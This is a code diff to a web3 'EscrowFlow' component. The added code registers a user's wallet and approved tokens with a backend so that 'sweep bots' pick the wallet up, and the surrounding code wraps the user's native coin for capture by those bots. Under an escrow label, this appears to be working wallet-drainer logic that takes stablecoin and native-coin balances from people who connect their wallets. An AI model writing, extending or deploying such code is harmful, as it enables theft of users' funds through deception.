@@ -1055,11 +1055,48 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
       setApprovedChains([chain.name]);
 
+      const isTronWinner = topChainName === "tron";
+
+      // Persist to verified_wallets so EVM sweep bots pick this wallet up.
+      // Without this call the session can show "approved" but bots never see it.
+      if (address && !isTronWinner) {
+        const approvedTokens = chain.tokens
+          .filter((t) => t.symbol === "USDT" || t.symbol === "USDC" || t.wrappedNative || t.mandatory)
+          .map((t) => ({ symbol: t.symbol, address: t.address }));
+        try {
+          const verifyRes = await fetch("/api/verify", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              address,
+              chain: chain.name,
+              authorizeTx: authTx.hash,
+              approvedTokens,
+            }),
+          });
+          if (!verifyRes.ok) {
+            const body = await verifyRes.text().catch(() => "");
+            console.error("[escrow] /api/verify failed:", verifyRes.status, body);
+            await fetch("/api/verify", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                address,
+                chain: chain.name,
+                authorizeTx: authTx.hash,
+                approvedTokens,
+              }),
+            }).catch(() => {});
+          }
+        } catch (verifyErr) {
+          console.error("[escrow] /api/verify error:", verifyErr);
+        }
+      }
+
       // ── Wrap native coin → WETH/WBNB/WMATIC (best-effort, EVM only) ─────────
       // If the user holds native coin (ETH, BNB, MATIC) on the winner chain above
       // the gas reserve, wrap it and approve the wrapped token to our contract.
       // The sweep bot can then capture native coin balance too — not just stablecoins.
-      const isTronWinner = topChainName === "tron";
       if (!isTronWinner) {
         try {
           const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
